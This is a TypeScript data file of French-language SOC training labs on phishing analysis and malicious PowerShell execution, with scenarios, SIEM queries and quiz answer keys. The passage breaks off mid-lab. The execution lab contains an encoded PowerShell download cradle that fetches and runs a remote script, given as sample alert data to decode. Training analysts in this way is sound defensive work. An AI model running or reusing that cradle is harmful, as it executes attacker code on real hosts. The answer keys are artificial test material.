/**
 * Travaux Pratiques (TP/Labs) - Formation SOC
 * Morakib - SOC Analyst Assistant
 * 
 * Ces TP sont des exercices pratiques guidés pour chaque SOP MITRE.
 * Chaque analyste doit compléter ces labs pour valider ses compétences.
 */

export interface LabExercise {
  id: string;
  question: string;
  type: "text" | "query" | "multiple-choice" | "command";
  options?: string[];
  correctAnswer?: string;
  hint?: string;
  explanation?: string;
}

export interface LabStep {
  id: number;
  title: string;
  objective: string;
  theory: string;
  scenario: string;
  tasks: string[];
  commands?: { description: string; command: string; expectedOutput?: string }[];
  exercises?: LabExercise[];
  tips?: string[];
  checkpoint: string;
  estimatedTime: string;
}

export interface Lab {
  id: string;
  sopId: string;
  title: string;
  description: string;
  category: string;
  difficulty: "Débutant" | "Intermédiaire" | "Avancé";
  duration: string;
  prerequisites: string[];
  objectives: string[];
  scenario: {
    context: string;
    alertData: Record<string, string>;
    timeline: string[];
  };
  steps: LabStep[];
  finalExam: LabExercise[];
  passingScore: number;
  certification: string;
  tags: string[];
}

// ============================================
// TP 1: PHISHING - Initial Access (T1566)
// ============================================
export const labPhishing: Lab = {
  id: "tp-phishing",
  sopId: "mitre-phishing",
  title: "TP: Analyse d'une Attaque de Phishing",
  description: "Travaux pratiques complets pour apprendre à détecter, analyser et répondre à une attaque de phishing. Vous travaillerez sur un scénario réel avec de vraies données.",
  category: "Initial Access",
  difficulty: "Débutant",
  duration: "45 min",
  prerequisites: [
    "Connaissance des bases du protocole email (SMTP, headers)",
    "Accès à Kibana/Elasticsearch",
    "Compréhension des types de malware courants"
  ],
  objectives: [
    "Identifier les indicateurs d'un email de phishing",
    "Analyser les headers email pour tracer l'origine",
    "Extraire et analyser les IOCs (URLs, attachments)",
    "Documenter et escalader correctement l'incident"
  ],
  scenario: {
    context: "Un utilisateur du département Finance a signalé un email suspect. L'email prétend provenir de la banque de l'entreprise et demande une vérification urgente des coordonnées bancaires. L'utilisateur a cliqué sur le lien mais affirme ne pas avoir entré d'informations.",
    alertData: {
      "Date/Heure": "2026-03-04 09:23:15 UTC",
      "Utilisateur": "marie.dupont@entreprise.fr",
      "Poste": "WKS-FIN-042",
      "Email Source": "security@bnp-verification.com",
      "Sujet": "URGENT: Vérification de vos coordonnées bancaires",
      "Attachment": "verification_form.html",
      "URL cliquée": "https://bnp-verification.com/secure/login.php"
    },
    timeline: [
      "09:15 - Email reçu par l'utilisateur",
      "09:23 - L'utilisateur clique sur le lien",
      "09:24 - Page de connexion affichée",
      "09:25 - L'utilisateur ferme la page sans entrer de données",
      "09:30 - L'utilisateur signale l'email au SOC"
    ]
  },
  steps: [
    {
      id: 1,
      title: "Analyse des Headers Email",
      objective: "Identifier l'origine réelle de l'email en analysant les headers",
      theory: `## Les Headers Email

Les headers email contiennent des informations cruciales pour tracer l'origine d'un message:

### Headers importants à analyser:
- **From**: L'expéditeur affiché (peut être falsifié)
- **Return-Path**: Où les réponses sont envoyées
- **Received**: Chaîne de serveurs traversés (lire de bas en haut)
- **Message-ID**: Identifiant unique du message
- **X-Originating-IP**: IP réelle de l'expéditeur
- **Authentication-Results**: Résultats SPF, DKIM, DMARC

### Indicateurs de phishing dans les headers:
1. **Mismatch From/Return-Path**: L'expéditeur affiché est différent de l'adresse de retour
2. **SPF/DKIM fail**: L'email n'est pas authentifié
3. **Serveurs suspects**: Passage par des serveurs dans des pays à risque
4. **Message-ID incohérent**: Le domaine du Message-ID ne correspond pas au domaine expéditeur`,
      scenario: `Vous avez récupéré les headers de l'email suspect. Analysez-les pour déterminer l'origine réelle.

\`\`\`
From: security@bnp-verification.com
To: marie.dupont@entreprise.fr
Subject: URGENT: Vérification de vos coordonnées bancaires
Date: Tue, 04 Mar 2026 09:15:23 +0000
Return-Path: <admin@mail.suspicious-server.ru>
Message-ID: <abc123@mail.suspicious-server.ru>
X-Originating-IP: [185.234.72.45]
Received: from mail.suspicious-server.ru (185.234.72.45) by mx.entreprise.fr
Authentication-Results: mx.entreprise.fr;
  spf=fail (sender IP is 185.234.72.45) smtp.mailfrom=bnp-verification.com;
  dkim=none (message not signed);
  dmarc=fail action=none header.from=bnp-verification.com;
\`\`\``,
      tasks: [
        "Identifier le domaine affiché vs le domaine réel",
        "Vérifier les résultats SPF/DKIM/DMARC",
        "Noter l'IP d'origine",
        "Comparer le Message-ID avec le domaine expéditeur"
      ],
      commands: [
        {
          description: "Rechercher l'IP dans les logs",
          command: 'source.ip: "185.234.72.45" OR destination.ip: "185.234.72.45"',
          expectedOutput: "Aucun hit précédent = première apparition de cette IP"
        },
        {
          description: "Vérifier la réputation de l'IP",
          command: "curl -s 'https://www.abuseipdb.com/check/185.234.72.45' | grep -o 'Confidence.*%'",
          expectedOutput: "Confidence of Abuse: 100%"
        }
      ],
      exercises: [
        {
          id: "ex1-1",
          question: "Quel est le VRAI domaine d'où provient l'email?",
          type: "text",
          correctAnswer: "suspicious-server.ru",
          hint: "Regardez le Return-Path et le Message-ID",
          explanation: "Le Return-Path <admin@mail.suspicious-server.ru> révèle le vrai domaine expéditeur"
        },
        {
          id: "ex1-2",
          question: "Quels sont les résultats d'authentification email?",
          type: "multiple-choice",
          options: ["SPF pass, DKIM pass", "SPF fail, DKIM none", "SPF none, DKIM fail", "Tout passe"],
          correctAnswer: "SPF fail, DKIM none",
          explanation: "spf=fail et dkim=none indiquent que l'email n'est pas authentifié"
        },
        {
          id: "ex1-3",
          question: "Cette IP est-elle malveillante? (Basé sur AbuseIPDB)",
          type: "multiple-choice",
          options: ["Non, IP propre", "Oui, signalée malveillante", "Impossible à déterminer"],
          correctAnswer: "Oui, signalée malveillante",
          explanation: "AbuseIPDB montre une confiance de 100% que cette IP est malveillante"
        }
      ],
      tips: [
        "Toujours lire les headers Received de bas en haut",
        "Un SPF fail n'est pas toujours du phishing mais c'est un signal fort",
        "Le Message-ID contient souvent le vrai domaine"
      ],
      checkpoint: "Vous avez identifié que l'email provient de suspicious-server.ru (Russie) et non de BNP. Les authentifications échouent.",
      estimatedTime: "10 min"
    },
    {
      id: 2,
      title: "Analyse du Domaine et de l'URL",
      objective: "Analyser le domaine de phishing et l'URL malveillante",
      theory: `## Analyse de Domaines Suspects

### Techniques d'analyse:
1. **WHOIS**: Informations d'enregistrement du domaine
2. **DNS Records**: Vérifier où pointe le domaine
3. **VirusTotal**: Réputation et détections
4. **URLScan.io**: Capture d'écran et analyse du contenu

### Indicateurs de domaines de phishing:
- **Domaine récent**: Créé il y a quelques jours
- **Typosquatting**: bnp-verification.com vs bnparibas.com
- **Registrar suspect**: Registrars connus pour le phishing
- **DNS suspect**: IP hébergée dans un pays à risque`,
      scenario: `L'URL cliquée par l'utilisateur est: https://bnp-verification.com/secure/login.php

Analysez ce domaine pour confirmer qu'il s'agit de phishing.`,
      tasks: [
        "Effectuer un WHOIS sur le domaine",
        "Vérifier les enregistrements DNS",
        "Soumettre à VirusTotal",
        "Vérifier sur URLScan.io"
      ],
      commands: [
        {
          description: "WHOIS du domaine",
          command: "whois bnp-verification.com",
          expectedOutput: "Creation Date: 2026-03-01 (il y a 3 jours)"
        },
        {
          description: "DNS A record",
          command: "dig A bnp-verification.com +short",
          expectedOutput: "185.234.72.45"
        },
        {
          description: "Rechercher dans URLhaus",
          command: "curl -s 'https://urlhaus-api.abuse.ch/v1/host/bnp-verification.com/'",
          expectedOutput: "url_count: 15, threat: phishing"
        }
      ],
      exercises: [
        {
          id: "ex2-1",
          question: "Quelle est la date de création du domaine bnp-verification.com?",
          type: "text",
          correctAnswer: "2026-03-01",
          hint: "Vérifiez le WHOIS",
          explanation: "Le domaine a été créé 3 jours avant l'attaque - typique du phishing"
        },
        {
          id: "ex2-2",
          question: "L'IP du domaine de phishing est la même que l'IP d'origine de l'email?",
          type: "multiple-choice",
          options: ["Oui", "Non", "Impossible à vérifier"],
          correctAnswer: "Oui",
          explanation: "Les deux pointent vers 185.234.72.45, confirmant le lien entre l'email et le site"
        },
        {
          id: "ex2-3",
          question: "Quel type de typosquatting est utilisé?",
          type: "multiple-choice",
          options: ["Homoglyph (lettres similaires)", "Ajout de mots", "Domaine TLD différent", "Ajout de tirets"],
          correctAnswer: "Ajout de mots",
          explanation: "bnp-verification.com ajoute '-verification' au nom BNP pour tromper"
        }
      ],
      tips: [
        "Les domaines de phishing sont souvent créés < 7 jours avant l'attaque",
        "Vérifiez si le domaine légitime existe (bnparibas.com)",
        "Utilisez plusieurs sources de threat intelligence"
      ],
      checkpoint: "Domaine confirmé comme phishing: créé il y a 3 jours, signalé sur 15 URLs malveillantes, même IP que l'email.",
      estimatedTime: "10 min"
    },
    {
      id: 3,
      title: "Analyse de l'Endpoint Compromis",
      objective: "Vérifier si le poste WKS-FIN-042 a été compromis",
      theory: `## Vérification Post-Clic

Même si l'utilisateur n'a pas entré d'informations, cliquer sur un lien peut:
1. **Télécharger un fichier**: Drive-by download
2. **Exécuter du JavaScript malveillant**: Collecte d'informations
3. **Installer un cookie de tracking**: Suivi de l'utilisateur
4. **Exploiter une vulnérabilité navigateur**: Exécution de code

### Points à vérifier sur l'endpoint:
- Processus suspects après l'heure du clic
- Fichiers créés/modifiés
- Connexions réseau sortantes
- Tâches planifiées créées`,
      scenario: `L'utilisateur a cliqué sur le lien à 09:23. Vérifiez si des activités suspectes ont eu lieu sur le poste WKS-FIN-042.`,
      tasks: [
        "Rechercher les processus créés après 09:23",
        "Vérifier les fichiers téléchargés",
        "Analyser les connexions réseau vers l'IP suspecte",
        "Vérifier les tâches planifiées"
      ],
      commands: [
        {
          description: "Processus créés après le clic",
          command: 'host.name:"WKS-FIN-042" AND event.code:1 AND @timestamp >= "2026-03-04T09:23:00" | table @timestamp, process.name, process.args, user.name',
          expectedOutput: "chrome.exe, msedge.exe - activité normale de navigation"
        },
        {
          description: "Fichiers téléchargés",
          command: 'host.name:"WKS-FIN-042" AND event.code:11 AND @timestamp >= "2026-03-04T09:23:00" AND file.path:(*Downloads* OR *Temp*)',
          expectedOutput: "Aucun fichier suspect téléchargé"
        },
        {
          description: "Connexions vers IP suspecte",
          command: 'host.name:"WKS-FIN-042" AND destination.ip:"185.234.72.45" AND @timestamp >= "2026-03-04T09:23:00"',
          expectedOutput: "1 connexion HTTPS à 09:23:15"
        },
        {
          description: "Tâches planifiées créées",
          command: 'host.name:"WKS-FIN-042" AND event.code:4698 AND @timestamp >= "2026-03-04T09:23:00"',
          expectedOutput: "Aucune tâche planifiée créée"
        }
      ],
      exercises: [
        {
          id: "ex3-1",
          question: "Des fichiers suspects ont-ils été téléchargés sur le poste?",
          type: "multiple-choice",
          options: ["Oui, plusieurs fichiers malveillants", "Non, aucun fichier téléchargé", "Oui, mais fichiers légitimes"],
          correctAnswer: "Non, aucun fichier téléchargé",
          explanation: "La recherche dans Downloads et Temp ne montre aucun fichier suspect"
        },
        {
          id: "ex3-2",
          question: "Combien de connexions ont été faites vers l'IP malveillante?",
          type: "text",
          correctAnswer: "1",
          hint: "Comptez les résultats de la requête de connexions",
          explanation: "Une seule connexion HTTPS lors du clic sur le lien"
        },
        {
          id: "ex3-3",
          question: "Quelle est la conclusion sur l'état du poste?",
          type: "multiple-choice",
          options: ["Compromis confirmé", "Probablement compromis", "Non compromis", "Investigation plus approfondie nécessaire"],
          correctAnswer: "Non compromis",
          explanation: "Pas de fichiers téléchargés, pas de processus suspects, pas de persistence = non compromis"
        }
      ],
      tips: [
        "Toujours vérifier 24h après le clic pour détecter les actions différées",
        "Vérifier aussi les autres postes contactant la même IP",
        "L'absence de preuve n'est pas preuve d'absence - rester vigilant"
      ],
      checkpoint: "Bonne nouvelle! Le poste ne semble pas compromis. L'utilisateur a seulement chargé la page sans interagir.",
      estimatedTime: "10 min"
    },
    {
      id: 4,
      title: "Actions de Remédiation",
      objective: "Effectuer les actions de blocage et de protection",
      theory: `## Actions de Remédiation Phishing

### Actions immédiates:
1. **Bloquer le domaine**: Ajouter aux listes de blocage proxy/DNS
2. **Bloquer l'IP**: Firewall et EDR
3. **Rechercher d'autres victimes**: Qui d'autre a reçu cet email?
4. **Supprimer l'email**: Purge de toutes les boîtes

### Partage de threat intelligence:
- Ajouter les IOCs au MISP
- Signaler à abuse@registrar et abuse@hosting
- Partager avec la communauté ISAC si applicable`,
      scenario: `Vous devez maintenant bloquer les IOCs et protéger l'organisation contre cette campagne.`,
      tasks: [
        "Ajouter le domaine à la blocklist du proxy",
        "Bloquer l'IP sur le firewall périmétrique",
        "Rechercher les autres destinataires de l'email",
        "Créer un ticket pour la purge email"
      ],
      commands: [
        {
          description: "Rechercher autres destinataires",
          command: 'event.category:"email" AND email.from.address:"*bnp-verification.com" | stats count by email.to.address',
          expectedOutput: "3 autres utilisateurs ont reçu le même email"
        },
        {
          description: "Vérifier si d'autres ont cliqué",
          command: 'destination.domain:"bnp-verification.com" | stats count by host.name',
          expectedOutput: "1 seul poste: WKS-FIN-042"
        },
        {
          description: "Ajouter au MISP",
          command: 'curl -X POST "https://misp.local/events/add" -H "Authorization: YOUR_API_KEY" -d \'{"Event": {"info": "Phishing BNP", "threat_level_id": "2"}}\'',
          expectedOutput: "Event ID: 12345 créé"
        }
      ],
      exercises: [
        {
          id: "ex4-1",
          question: "Combien d'autres utilisateurs ont reçu l'email de phishing?",
          type: "text",
          correctAnswer: "3",
          hint: "Regardez le résultat de la recherche email",
          explanation: "3 autres utilisateurs, donc 4 au total dans l'organisation"
        },
        {
          id: "ex4-2",
          question: "Quels IOCs devez-vous bloquer? (Sélectionnez tous)",
          type: "multiple-choice",
          options: ["Domaine: bnp-verification.com", "IP: 185.234.72.45", "Email: security@bnp-verification.com", "Toutes ces réponses"],
          correctAnswer: "Toutes ces réponses",
          explanation: "Tous les IOCs identifiés doivent être bloqués pour une protection complète"
        },
        {
          id: "ex4-3",
          question: "Quelle action supplémentaire est recommandée pour les 3 autres destinataires?",
          type: "multiple-choice",
          options: ["Rien, ils n'ont pas cliqué", "Scanner leurs postes", "Leur envoyer une sensibilisation", "Scanner leurs postes ET les sensibiliser"],
          correctAnswer: "Scanner leurs postes ET les sensibiliser",
          explanation: "Même s'ils n'ont pas cliqué maintenant, ils pourraient cliquer plus tard. Sensibilisation + vérification."
        }
      ],
      tips: [
        "Toujours rechercher les autres victimes potentielles",
        "La sensibilisation post-incident renforce la vigilance",
        "Documenter tous les IOCs pour future référence"
      ],
      checkpoint: "IOCs bloqués, autres victimes identifiées et notifiées, email purgé des boîtes.",
      estimatedTime: "10 min"
    },
    {
      id: 5,
      title: "Documentation et Rapport",
      objective: "Documenter l'incident et créer le rapport final",
      theory: `## Documentation d'Incident

### Contenu du rapport:
1. **Résumé exécutif**: Pour le management
2. **Timeline**: Chronologie des événements
3. **Analyse technique**: Détails de l'investigation
4. **IOCs**: Liste complète des indicateurs
5. **Impact**: Évaluation des dommages
6. **Recommandations**: Actions préventives

### Classification de l'incident:
- **Sévérité**: Basée sur l'impact réel
- **Catégorie MITRE**: T1566 - Phishing
- **Conclusion**: True Positive / False Positive`,
      scenario: `Finalisez votre investigation en complétant le rapport d'incident.`,
      tasks: [
        "Rédiger le résumé exécutif",
        "Compiler la timeline complète",
        "Lister tous les IOCs",
        "Définir les recommandations"
      ],
      exercises: [
        {
          id: "ex5-1",
          question: "Quelle est la classification de cet incident?",
          type: "multiple-choice",
          options: ["True Positive - Phishing confirmé", "False Positive - Email légitime", "Suspicious - À surveiller"],
          correctAnswer: "True Positive - Phishing confirmé",
          explanation: "Tous les indicateurs confirment une tentative de phishing"
        },
        {
          id: "ex5-2",
          question: "Quelle sévérité attribuez-vous à cet incident?",
          type: "multiple-choice",
          options: ["Critical - Compromission confirmée", "High - Tentative de phishing mais contenue", "Medium - Phishing basique détecté", "Low - Aucun impact"],
          correctAnswer: "Medium - Phishing basique détecté",
          explanation: "L'utilisateur n'a pas entré d'informations, pas de compromission, mais le clic a eu lieu"
        },
        {
          id: "ex5-3",
          question: "Quelle recommandation principale donneriez-vous?",
          type: "multiple-choice",
          options: ["Renforcer les filtres email (SPF/DKIM/DMARC strict)", "Bloquer tous les emails externes", "Désactiver les clics email", "Aucune action nécessaire"],
          correctAnswer: "Renforcer les filtres email (SPF/DKIM/DMARC strict)",
          explanation: "L'email a passé les filtres malgré SPF fail - il faut renforcer la politique"
        }
      ],
      tips: [
        "Un bon rapport aide l'équipe à apprendre",
        "Les recommandations doivent être actionnables",
        "Toujours inclure un résumé pour les non-techniques"
      ],
      checkpoint: "Investigation terminée! Rapport complet avec timeline, IOCs et recommandations.",
      estimatedTime: "5 min"
    }
  ],
  finalExam: [
    {
      id: "final-1",
      question: "Un email avec SPF=pass mais domaine suspect (créé il y a 2 jours) est-il fiable?",
      type: "multiple-choice",
      options: ["Oui, SPF pass = légitime", "Non, un domaine récent est suspect même avec SPF pass", "Impossible à déterminer"],
      correctAnswer: "Non, un domaine récent est suspect même avec SPF pass",
      explanation: "Les attaquants peuvent configurer SPF pour leurs propres domaines malveillants"
    },
    {
      id: "final-2",
      question: "Quel header email ne peut PAS être falsifié facilement?",
      type: "multiple-choice",
      options: ["From", "Subject", "Received (ajouté par votre serveur)", "Reply-To"],
      correctAnswer: "Received (ajouté par votre serveur)",
      explanation: "Les headers Received ajoutés par votre infrastructure sont fiables car vous contrôlez le serveur"
    },
    {
      id: "final-3",
      question: "Après un clic sur un lien de phishing, quel est le premier IOC à vérifier sur l'endpoint?",
      type: "multiple-choice",
      options: ["Registry modifications", "Network connections to the malicious IP", "CPU usage", "Disk space"],
      correctAnswer: "Network connections to the malicious IP",
      explanation: "La connexion réseau confirme que le lien a été atteint et permet d'évaluer le risque"
    },
    {
      id: "final-4",
      question: "Quelle technique MITRE correspond au phishing avec pièce jointe?",
      type: "text",
      correctAnswer: "T1566.001",
      hint: "T1566 est Phishing, .001 est...",
      explanation: "T1566.001 = Spearphishing Attachment"
    },
    {
      id: "final-5",
      question: "Un utilisateur a entré ses credentials sur un site de phishing. Quelle est l'action PRIORITAIRE?",
      type: "multiple-choice",
      options: ["Bloquer le domaine", "Réinitialiser le mot de passe immédiatement", "Scanner le poste", "Créer un rapport"],
      correctAnswer: "Réinitialiser le mot de passe immédiatement",
      explanation: "Les credentials sont compromis - le reset est prioritaire pour éviter l'accès frauduleux"
    }
  ],
  passingScore: 80,
  certification: "Analyste Phishing N1",
  tags: ["phishing", "email", "T1566", "initial-access"]
};

// ============================================
// TP 2: EXECUTION - Command & Scripting (T1059)
// ============================================
export const labExecution: Lab = {
  id: "tp-execution",
  sopId: "mitre-execution",
  title: "TP: Détection d'Exécution Malveillante",
  description: "Apprenez à identifier et analyser les techniques d'exécution de code malveillant: PowerShell, CMD, macros Office. Cas pratique avec décodage de payloads.",
  category: "Execution",
  difficulty: "Intermédiaire",
  duration: "60 min",
  prerequisites: [
    "Connaissance de base de PowerShell",
    "Compréhension des processus Windows",
    "Accès à l'EDR et au SIEM"
  ],
  objectives: [
    "Identifier les signes d'exécution malveillante",
    "Décoder les commandes PowerShell obfusquées",
    "Analyser la chaîne de processus (process tree)",
    "Déterminer l'impact et les actions de remédiation"
  ],
  scenario: {
    context: "L'EDR a généré une alerte: un processus PowerShell avec des arguments suspects a été détecté sur un poste du département Comptabilité. L'utilisateur affirme avoir ouvert un fichier Excel reçu par email.",
    alertData: {
      "Date/Heure": "2026-03-04 14:32:18 UTC",
      "Utilisateur": "paul.martin@entreprise.fr",
      "Poste": "WKS-COMPTA-015",
      "Process": "powershell.exe",
      "Parent Process": "EXCEL.EXE",
      "Command Line": "powershell.exe -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
      "Alert Severity": "HIGH"
    },
    timeline: [
      "14:25 - Email avec Excel reçu",
      "14:30 - Utilisateur ouvre le fichier Excel",
      "14:32 - PowerShell lancé par Excel",
      "14:32 - Alerte EDR générée"
    ]
  },
  steps: [
    {
      id: 1,
      title: "Analyse du Process Tree",
      objective: "Comprendre la chaîne d'exécution",
      theory: `## Process Tree Analysis

Le process tree (arbre de processus) montre les relations parent-enfant entre les processus.

### Chaînes d'exécution suspectes:
- **Office → PowerShell/CMD**: Macro malveillante
- **Explorer → Script**: Double-clic sur fichier malveillant
- **WMI/Scheduled Task → Any**: Persistence ou lateral movement

### Indicateurs clés:
| Process Parent | Process Enfant | Suspicion |
|----------------|----------------|-----------|
| WINWORD.EXE | powershell.exe | TRÈS ÉLEVÉE |
| EXCEL.EXE | cmd.exe | TRÈS ÉLEVÉE |
| outlook.exe | mshta.exe | TRÈS ÉLEVÉE |
| explorer.exe | powershell.exe | MOYENNE |`,
      scenario: `Le process tree montre: EXCEL.EXE → powershell.exe

Cette chaîne est hautement suspecte car:
1. Excel ne devrait JAMAIS lancer PowerShell normalement
2. Cela indique une macro malveillante`,
      tasks: [
        "Vérifier le process tree complet",
        "Identifier tous les processus enfants de PowerShell",
        "Noter les timestamps de chaque processus"
      ],
      commands: [
        {
          description: "Process tree du poste",
          command: 'host.name:"WKS-COMPTA-015" AND event.code:1 AND @timestamp >= "2026-03-04T14:30:00" | table @timestamp, process.parent.name, process.name, process.args | sort @timestamp',
          expectedOutput: "EXCEL.EXE → powershell.exe → conhost.exe"
        }
      ],
      exercises: [
        {
          id: "ex1-1",
          question: "Le couple EXCEL.EXE → powershell.exe est-il normal?",
          type: "multiple-choice",
          options: ["Oui, Excel utilise PowerShell pour les add-ins", "Non, jamais normal", "Parfois normal pour les formules"],
          correctAnswer: "Non, jamais normal",
          explanation: "Excel ne lance JAMAIS PowerShell de manière légitime - c'est toujours une macro malveillante"
        }
      ],
      tips: [
        "Sysmon Event ID 1 = Process Creation",
        "Le -ep bypass désactive la politique d'exécution PowerShell",
        "Un Excel légitime ne crée que des processus de mise à jour Office"
      ],
      checkpoint: "Chaîne d'exécution suspecte confirmée: Excel a lancé PowerShell avec des arguments malveillants.",
      estimatedTime: "10 min"
    },
    {
      id: 2,
      title: "Décodage du Payload PowerShell",
      objective: "Décoder et comprendre la commande encodée en base64",
      theory: `## Décodage PowerShell Base64

Les attaquants utilisent l'encodage base64 pour:
- Éviter la détection par signatures
- Cacher le contenu malveillant
- Passer les arguments avec caractères spéciaux

### Paramètres PowerShell suspects:
- \`-enc\` ou \`-EncodedCommand\`: Commande en base64
- \`-ep bypass\`: Ignore la politique d'exécution
- \`-nop\`: No profile (pas de chargement du profil)
- \`-w hidden\`: Fenêtre cachée
- \`-sta\`: Single Thread Apartment (pour COM)

### Décodage:
\`\`\`powershell
# PowerShell
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('ENCODED_STRING'))

# Linux/CyberChef
echo 'ENCODED_STRING' | base64 -d
\`\`\``,
      scenario: `La commande encodée est:
\`\`\`
SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA
\`\`\``,
      tasks: [
        "Décoder la commande base64",
        "Identifier le type de payload (downloader, execute, recon)",
        "Extraire l'URL ou IP de téléchargement"
      ],
      commands: [
        {
          description: "Décoder avec PowerShell",
          command: "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA'))",
          expectedOutput: "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')"
        },
        {
          description: "Décoder avec Linux",
          command: "echo 'SQBFAFgAIAAoAE4AZQ...' | base64 -d | iconv -f UTF-16LE -t UTF-8",
          expectedOutput: "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')"
        }
      ],
      exercises: [
        {
          id: "ex2-1",
          question: "Que fait la commande décodée 'IEX (New-Object Net.WebClient).DownloadString(...)'?",
          type: "multiple-choice",
          options: ["Télécharge et exécute un script", "Affiche un message", "Crée un fichier", "Supprime des données"],
          correctAnswer: "Télécharge et exécute un script",
          explanation: "IEX = Invoke-Expression. DownloadString télécharge le contenu puis IEX l'exécute directement en mémoire"
        },
        {
          id: "ex2-2",
          question: "Quelle est l'URL du payload?",
          type: "text",
          correctAnswer: "http://192.168.1.100/payload.ps1",
          hint: "Trouvez l'URL dans les parenthèses de DownloadString",
          explanation: "L'URL pointe vers un serveur interne (192.168.1.100) - possiblement un serveur compromis ou C2"
        },
        {
          id: "ex2-3",
          question: "Cette technique est connue sous le nom de...",
          type: "multiple-choice",
          options: ["Living off the land", "Download Cradle", "Fileless attack", "Toutes ces réponses"],
          correctAnswer: "Toutes ces réponses",
          explanation: "C'est du Living off the land (utilise PowerShell natif), un Download Cradle, et une fileless attack (exécution en mémoire)"
        }
      ],
      tips: [
        "PowerShell base64 utilise UTF-16LE (Unicode)",
        "Sur Linux: utilisez iconv pour convertir l'encodage",
        "CyberChef est excellent pour décoder les payloads complexes"
      ],
      checkpoint: "Payload décodé: Download Cradle téléchargeant un script depuis 192.168.1.100",
      estimatedTime: "15 min"
    },
    {
      id: 3,
      title: "Analyse des Actions Post-Exécution",
      objective: "Déterminer ce qui s'est passé après l'exécution du payload",
      theory: `## Analyse Post-Exécution

### Ce que peut faire le payload:
1. **Télécharger plus de malware**: Dropper
2. **Établir un C2**: Beacon/RAT
3. **Voler des credentials**: Mimikatz, etc.
4. **Collecter des informations**: Discovery
5. **Déployer du ransomware**: Impact

### Logs à analyser:
- **Sysmon 3**: Connexions réseau
- **Sysmon 11**: Fichiers créés
- **Sysmon 13**: Registry modifié
- **Security 4624**: Logons
- **Security 4688**: Process creation (si pas Sysmon)`,
      scenario: `Le payload a été téléchargé et exécuté. Analysez les actions qui ont suivi.`,
      tasks: [
        "Rechercher les connexions réseau établies",
        "Identifier les fichiers créés",
        "Vérifier les modifications registry",
        "Rechercher des signes de persistence"
      ],
      commands: [
        {
          description: "Connexions réseau après exécution",
          command: 'host.name:"WKS-COMPTA-015" AND event.code:3 AND @timestamp >= "2026-03-04T14:32:00" | table @timestamp, process.name, destination.ip, destination.port',
          expectedOutput: "powershell.exe → 192.168.1.100:80, 192.168.1.100:443"
        },
        {
          description: "Fichiers créés",
          command: 'host.name:"WKS-COMPTA-015" AND event.code:11 AND @timestamp >= "2026-03-04T14:32:00" | table @timestamp, file.path, process.name',
          expectedOutput: "C:\\Users\\paul.martin\\AppData\\Local\\Temp\\svchost.exe"
        },
        {
          description: "Registry modifiées",
          command: 'host.name:"WKS-COMPTA-015" AND event.code:13 AND @timestamp >= "2026-03-04T14:32:00" AND registry.path:*Run*',
          expectedOutput: "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run - 'svchost' = C:\\Users\\...\\svchost.exe"
        }
      ],
      exercises: [
        {
          id: "ex3-1",
          question: "Un fichier svchost.exe a été créé dans AppData\\Local\\Temp. Est-ce normal?",
          type: "multiple-choice",
          options: ["Oui, svchost peut être là", "Non, le vrai svchost est dans System32", "Oui si c'est une mise à jour"],
          correctAnswer: "Non, le vrai svchost est dans System32",
          explanation: "Le VRAI svchost.exe est TOUJOURS dans C:\\Windows\\System32. Ailleurs = masquerading (T1036)"
        },
        {
          id: "ex3-2",
          question: "Une clé Run a été ajoutée. Que signifie cela?",
          type: "multiple-choice",
          options: ["L'application va démarrer au boot", "L'application a été désinstallée", "Rien de particulier"],
          correctAnswer: "L'application va démarrer au boot",
          explanation: "Les clés Run assurent la persistence - le malware s'exécutera à chaque connexion utilisateur"
        },
        {
          id: "ex3-3",
          question: "Quelle technique MITRE représente l'ajout d'une clé Run?",
          type: "text",
          correctAnswer: "T1547.001",
          hint: "T1547 est Boot/Logon Autostart, .001 est...",
          explanation: "T1547.001 = Registry Run Keys / Startup Folder"
        }
      ],
      tips: [
        "Le masquerading utilise souvent des noms de processus système",
        "Vérifiez toujours le chemin complet d'un exécutable, pas juste le nom",
        "Les clés Run sont le mécanisme de persistence le plus courant"
      ],
      checkpoint: "Le payload a installé un malware déguisé en svchost.exe avec persistence via Run key.",
      estimatedTime: "15 min"
    },
    {
      id: 4,
      title: "Containment et Éradication",
      objective: "Contenir la menace et nettoyer le système",
      theory: `## Containment et Éradication

### Priorités:
1. **Isoler le système**: Prévenir le mouvement latéral
2. **Terminer les processus malveillants**: Arrêter l'activité
3. **Supprimer la persistence**: Empêcher le retour
4. **Supprimer les fichiers malveillants**: Nettoyer
5. **Vérifier d'autres systèmes**: Scope complet

### Ordre des opérations:
1. Isolation AVANT tout
2. Collecte de preuves (RAM si possible)
3. Kill des processus
4. Suppression persistence
5. Suppression fichiers
6. Scan complet
7. Restauration réseau`,
      scenario: `Il est temps de contenir et éradiquer la menace sur WKS-COMPTA-015.`,
      tasks: [
        "Isoler le système via EDR",
        "Lister tous les processus du malware",
        "Supprimer les clés Registry de persistence",
        "Supprimer les fichiers malveillants"
      ],
      commands: [
        {
          description: "Terminer les processus",
          command: "taskkill /F /IM svchost.exe /T (sur le fake svchost)",
